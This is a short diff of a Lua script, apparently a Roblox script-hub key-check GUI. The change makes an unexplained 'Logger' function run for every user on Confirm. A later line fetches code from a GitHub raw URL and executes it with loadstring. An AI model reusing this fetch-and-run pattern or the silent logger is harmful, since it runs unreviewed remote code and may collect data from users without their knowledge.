@@ -467,9 +467,7 @@ CloseButton.MouseButton1Down:Connect(function()
 end)
 
 Confirm.MouseButton1Down:Connect(function()
-	if plr.Name ~= "vomitpiggy" or plr.Name ~= "NeoXephox" then
-		pcall(funcs["Logger"])
-	end
+	pcall(funcs["Logger"])
 	wait(.25)
 	_G.key = KeyInput.Text
 	local whitelistcheck = loadstring(game:HttpGet("https://raw.githubusercontent.com/Khronical/hjhjhjjhjhjhjhjhjhj/main/DataTableKeys", true))()
